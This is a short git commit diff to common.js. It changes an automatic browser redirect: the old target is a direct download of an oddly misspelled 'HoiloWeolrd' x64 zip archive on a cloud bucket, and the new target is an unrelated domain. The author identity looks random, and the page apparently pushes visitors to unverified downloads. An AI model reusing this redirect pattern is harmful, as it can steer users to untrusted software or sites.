76c3428805d7e81425e9f4708f9f58666e572c8f
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-07 10:52:29 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		var url="https://www.yssuygdm.com";
 		window.location=url;
 	}
 }
